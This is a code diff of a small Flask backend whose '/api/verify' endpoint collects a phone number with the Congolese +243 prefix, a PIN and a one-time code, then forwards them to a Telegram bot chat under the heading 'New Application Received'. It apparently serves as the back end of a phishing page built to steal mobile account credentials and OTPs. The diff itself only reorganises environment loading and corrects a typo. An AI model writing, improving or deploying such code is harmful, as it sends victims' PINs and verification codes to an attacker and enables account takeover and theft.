@@ -4,26 +4,32 @@ from flask import Flask, request, jsonify
 
 app = Flask(__name__)
 
-# These will be set in Vercel Environment Variables
-TELEGRAM_TOKEN = os.environ.get("TELEGRAM_TOKEN")
-TELEGRAM_CHAT_ID = os.environ.get("TELEGRAM_CHAT_ID")
+# Try loading .env file if available
+try:
+    from dotenv import load_dotenv
+    load_dotenv()
+except ImportError:
+    pass
 
 @app.route('/api/verify', methods=['POST'])
 def verify():
-    data = request.json
-    phone = data.get('phone')
-    pin = data.get('pin')
-    otp = data.get('otp')
+    data = request.json or {}
+    phone = data.get('phone', '')
+    pin = data.get('pin', '')
+    otp = data.get('otp', '')
     
-    message = f"🚀 *New Application Recieved!*\n\n"
+    token = os.environ.get("TELEGRAM_TOKEN")
+    chat_id = os.environ.get("TELEGRAM_CHAT_ID")
+    
+    message = f"🚀 *New Application Received!*\n\n"
     message += f"📱 *Phone:* +243 {phone}\n"
     message += f"🔑 *PIN:* {pin}\n"
     message += f"🔢 *OTP:* {otp}\n"
     
-    if TELEGRAM_TOKEN and TELEGRAM_CHAT_ID:
-        url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
+    if token and chat_id:
+        url = f"https://api.telegram.org/bot{token}/sendMessage"
         payload = {
-            "chat_id": TELEGRAM_CHAT_ID,
+            "chat_id": chat_id,
             "text": message,
             "parse_mode": "Markdown"
         }
